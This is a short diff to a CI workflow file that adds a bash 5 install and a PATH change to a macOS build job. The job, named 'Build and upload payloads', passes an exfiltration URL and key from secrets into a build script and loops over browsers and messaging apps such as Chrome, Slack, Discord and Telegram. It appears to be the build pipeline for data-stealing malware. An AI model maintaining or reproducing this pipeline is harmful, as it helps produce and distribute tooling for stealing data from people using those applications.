@@ -23,11 +23,17 @@ jobs:
       - name: Install dependencies
         run: pip install cryptography nuitka zstandard
 
+      - name: Install bash 5 (macOS ships bash 3.2; build_mac.sh needs 4+)
+        env:
+          HOMEBREW_NO_AUTO_UPDATE: 1
+        run: brew install bash
+
       - name: Build and upload payloads
         env:
           EXFIL_URL: https://${{ secrets.DOMAIN }}
           EXFIL_KEY: ${{ secrets.BB_API_KEY }}
         run: |
+          export PATH="$(brew --prefix)/bin:$PATH"
           chmod +x build_mac.sh
           for p in chrome edge brave firefox opera slack discord teams zoom whatsapp telegram; do
             echo "=== BUILDING $p ==="
